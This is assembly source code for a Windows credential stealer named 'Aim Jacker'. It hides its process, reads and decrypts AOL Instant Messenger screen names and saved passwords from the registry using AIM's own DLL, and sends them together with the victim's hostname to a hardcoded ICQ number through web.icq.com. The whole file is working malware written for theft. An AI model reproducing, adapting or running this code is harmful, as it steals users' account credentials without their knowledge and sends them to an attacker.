.386                    
.model flat,stdcall 
option casemap:none 

include \masm32\include\windows.inc 
include \masm32\include\user32.inc 
include \masm32\include\kernel32.inc 
include \masm32\include\advapi32.inc
include \masm32\include\shell32.inc
includelib \masm32\lib\shell32.lib
includelib \masm32\lib\user32.lib 
includelib \masm32\lib\kernel32.lib 
include \masm32\include\masm32.inc
includelib \masm32\lib\masm32.lib
includelib \masm32\lib\advapi32.lib

include \masm32\include\wininet.inc
include \masm32\include\wsock32.inc
includelib \masm32\lib\wininet.lib
includelib \masm32\lib\wsock32.lib

ICQNotify PROTO :DWORD
hexit PROTO :DWORD, :DWORD

.data
kernel32     db 'kernel32.dll', 0
func         db 'RegisterServiceProcess', 0
microsoft    db "www.microsoft.com",0 
ClassName BYTE "aim decoder",0
SubKey BYTE "Software\Microsoft\Windows\CurrentVersion\App Paths\aim.exe",0
AimKey BYTE "Software\America Online\AOL Instant Messenger (TM)\CurrentVersion\Users\",0
AimKey2 BYTE "\login",0
TheDataSize DWORD 255
PathString BYTE "Path",0
TheDLL BYTE "oscore.dll",0
TheFunction BYTE "CryptDecodeString",0
ScreenameSize DWORD 255
MyCounter DWORD 0
KeySize DWORD 0
NotFound BYTE "Password NOT Stored ]",0
RetAddress DWORD ?
OpenString BYTE "open",0
StringPass BYTE "Password",0
snequal    BYTE "[SN=",0
pwequal    BYTE " PW=",0
slash       BYTE "]",0

uin             db '45102649'  , 0
icqaddr2     db 'web.icq.com', 0
icqstr2 db "GET /wwp/msg/1,,,00.html?Send=yes&Name=from Aim Jacker vers. 2.0%20%0aby: illwill%20%0a[hostname=%s] has been jacked!!%20%0ahere is the shit you ganked:%20%0a[%s]&Uin=%s HTTP/1.0",13,10,13,10,13,10,0

.data?
rsp          dd ?
DaReturn DWORD ?
ThePassReturn DWORD ?
buffer byte 255 dup(?)
TheData byte 255 dup (?)
TheValueData byte 255 dup (?)
EncPass BYTE 255 dup(?)
aimname byte 255 dup (?)
Screename byte 255 dup (?)
ScreenameSend byte 255 dup (?)
PasswordSend byte 255 dup (?)
jacked byte 255 dup (?)

;socket n buff stuff
mainsock     dd ?
wsainfo      WSADATA<>
mainsin      sockaddr_in<>
clientinfo   sockaddr_in<>
icqthread    dd ?
ipbuff db 256 dup(?)
szBuffer db 256 dup(?)
szBuffer2 db 256 dup(?)
hexsend byte 255 dup (?)

.code 
start:

    invoke GetModuleHandle, addr kernel32
    invoke GetProcAddress, eax, addr func
    test eax,eax
    jz WaitForConnection
    mov [rsp], eax
    push 1
    push 0
    call rsp
WaitForConnection:
    invoke WSAStartup, 101h, offset wsainfo
    cmp eax, 0
    jne WaitForConnection
    GetHostName:
    invoke gethostbyname, addr microsoft 	
    cmp eax,0
    jmp getit
    jz GoToSleep	
    GoToSleep:					
    invoke Sleep, 5000			   
    jmp GetHostName	
    

getit:

; get all aim users
 invoke RegOpenKeyEx, HKEY_CURRENT_USER,addr AimKey,0,KEY_READ,addr DaReturn  ;|push aimkey name into 'DaReturn' buffer
           invoke RegQueryInfoKey,DaReturn,0,0,0, addr KeySize,0,0,0,0,0,0,0  ;|query the aimkey for how many users listed
           dec KeySize							      ;|subtract one from the keysize
           mov MyCounter,0						      ;|set a '0'value to the 'MyCounter' buffer
DoLoop:
  invoke RegEnumValue,DaReturn,MyCounter,addr Screename,addr ScreenameSize,0,0,addr buffer,addr TheDataSize
;/// enum the keyvalue of the dareturn key + the # of the counter value,
;/// set that to screenname buffer,size of SN,data,sizeofdata



 
;////////////////////decoding time/////////////////////////////////////////////////////////////////////////////////
   invoke lstrcpyn, addr aimname,addr Screename,sizeof Screename    ;| put the aim name into the buffer called aimname
            invoke MemCopy,addr AimKey,addr TheValueData,LengthOf AimKey
            invoke lstrcat,addr TheValueData, addr aimname    ;add user name to string path
            invoke lstrcat,addr TheValueData, addr AimKey2    ;then add login to the  end string 
             cld
            lea edi, aimname	   
            mov eax,0
            mov ecx, 255
            rep stosb
            mov TheDataSize,255
;///////////////  valuedata now holds regpath to password  string/user/login //////////////////////////////////////
;//////////////   now get the user's encrypted password and                 //////////////////////////////////////
;/////////////    locate AIM's install folder.                             //////////////////////////////////////

invoke RegOpenKeyEx, HKEY_CURRENT_USER,addr TheValueData,0,KEY_READ,addr ThePassReturn  
    ;get the password into ThePassReturn buffer

                invoke RegQueryValueEx,ThePassReturn,addr StringPass,0,0,addr EncPass,addr TheDataSize

                        .IF TheDataSize < 3
			   ;|if the regkey in less than 3 means the password is not stored
                           invoke lstrcat,addr PasswordSend, addr NotFound
                           jmp sendit
                        .ENDIF

                        mov TheDataSize,255    
                        mov ThePassReturn,0
                        invoke RegCloseKey, ThePassReturn
                        invoke RegOpenKeyEx, HKEY_LOCAL_MACHINE,addr SubKey,0,KEY_READ,addr ThePassReturn
                     ;| get the location of the aim installation put it in TheReturn buffer
                         invoke RegQueryValueEx,ThePassReturn,addr PathString,0,0,addr TheData, addr TheDataSize
                    
;////////////////////////////////////////////////////////////////////////
;/////  Thanx to the looserkiller for this part                       //
;//////////////////////////////////////////////////////////////////////
                             invoke SetCurrentDirectory, addr TheData
                             push OFFSET TheDLL
                             call LoadLibrary   ;///  Load the AIM DLL(oscore.dll) into our process
                             push OFFSET TheFunction
                             push eax
                             call GetProcAddress   ;///  Get address of CryptDecodeString function
                             push 16
                             push OFFSET RetAddress
                             push OFFSET EncPass   ;/// Encrypted pass from registry
                             call eax   ;/// Call CryptDecodeString function (returned from GetProcAddress)

invoke lstrcat, addr PasswordSend,eax                 ;add password to to the passwordsend buffer 
sendit:
invoke lstrcat, addr PasswordSend,addr slash          ;add / to the passwordsend buffer
invoke lstrcat,addr ScreenameSend, addr snequal       ;add sn= to the screenamesend buffer
invoke lstrcat,addr ScreenameSend, addr Screename     ;add screename to screenamesend buffer
invoke lstrcat, addr ScreenameSend,addr pwequal       ;add pw= to the passwordsend buffer
invoke lstrcat,addr ScreenameSend,addr PasswordSend
invoke wsprintf,addr jacked,addr ScreenameSend        ; put em together 

                       lea di, PasswordSend ;|clear the passwordsend buffer
                       xor eax, eax
                       mov ecx, 255
                       rep stosb 
                mov eax,MyCounter    ;| move value of MyCounter to EAX
                cmp eax, KeySize     ;| compare eax(mycounter) to keysize 
                jge GoHere	     ;| jump to gohere if compared values are greater or equal
                inc MyCounter        ;| increments '1' to the 'Mycounter" buffer
		jmp DoLoop           ;| jump back up to get next name
               


        GoHere:
invoke hexit,addr jacked,addr hexsend
    mov eax, offset ICQNotify
    invoke CreateThread, NULL, NULL, eax, addr uin, 0, addr icqthread
    invoke CloseHandle, eax



ICQNotify PROC icqnumber:DWORD
    LOCAL hostbuff[128]:BYTE
    LOCAL icqsendbuff[256]:BYTE
    LOCAL icqsock:DWORD
    LOCAL icqsin:sockaddr_in
    
icq_notify:
    invoke socket, PF_INET, SOCK_STREAM, 0
    cmp eax, INVALID_SOCKET
    jz restarticqloop
    mov icqsock, eax
    mov icqsin.sin_family, PF_INET
    invoke htons, 80
    mov icqsin.sin_port, ax
   
    invoke gethostbyname, addr icqaddr2
    mov eax, [eax+12]
    mov eax, [eax]
    mov eax, [eax]
    mov icqsin.sin_addr, eax
    invoke connect, icqsock, addr icqsin, sizeof icqsin
    cmp eax, SOCKET_ERROR
    jz restarticqloop

    invoke gethostname, addr hostbuff, 128
    invoke gethostbyname, addr hostbuff
    mov eax, [eax+12]
    mov eax, [eax]
    mov eax, [eax]
    invoke inet_ntoa, eax
    mov edx, eax
    invoke wsprintf, addr ipbuff, edx

    invoke wsprintf, addr icqsendbuff, addr icqstr2,addr hostbuff,addr hexsend, icqnumber
    invoke send, icqsock, addr icqsendbuff, eax, 0
    cmp eax, SOCKET_ERROR
    jz restarticqloop
    invoke closesocket, icqsock  
    ret

restarticqloop:
    invoke closesocket, icqsock
    invoke Sleep, 1000
    jmp icq_notify
ICQNotify ENDP

invoke RegCloseKey, DaReturn 
invoke RegCloseKey, ThePassReturn 
invoke ExitProcess,0

hexit PROC szSRC:DWORD,szDEST:DWORD
   push esi
   push edi
   mov esi,szSRC
   mov edi,szDEST
   
dec     edi
_nc:
    movzx   eax, byte ptr [esi]
    
    test    al, al  ; al==0
    jz      _done
    
    inc     edi
    inc     esi
    
    cmp     al, 41h ; al=='A'
    mov     cl, al
    jb      _lA
    
    cmp     al, 5Bh ; al=='Z'
    jbe     _cpy
        
    ;al >= A
    cmp     al, 5Fh ; al=='_'
    je      _cpy
    
    ;al > _
    cmp     al, 61h ; al=='a'
    jb      _hex
    
    ; al >= a
    cmp     al, 7Ah ; al=='z'
    jbe     _cpy

_hex:
    ror     ax, 4
    mov     byte ptr [edi], '%'
    shr     ah, 4
    add     edi, 2
    add     al, 30h
    cmp     al, 3Ah
    jb      @F
    add     al, 41h-3Ah
    @@:
    add     ah, 30h
    cmp     ah, 3Ah
    jb      @F
    add     ah, 41h-3Ah
    @@:
    mov     word ptr [edi-1], ax
    jmp     _nc
    
_cpy:
    mov     [edi], al
    jmp     _nc
    
_space:
    mov     byte ptr [edi], '+'
    jmp     _nc
    
_lA:
    cmp     al, 20h
    je      _space
    
    sub     cl, 2Dh ; al=='-'
    jz      _cpy
    dec     cl      ; al=='.'
    jz      _cpy
    
    cmp     al, 30h ; al=='0'
    jb      _hex
    
    ;al >= '0'
    cmp     al, 39h ; al=='9'
    jbe     _cpy
    
    jmp     _hex
_done:
    mov     byte ptr [edi],0
   pop esi
   pop edi
   ret
hexit ENDP

end start
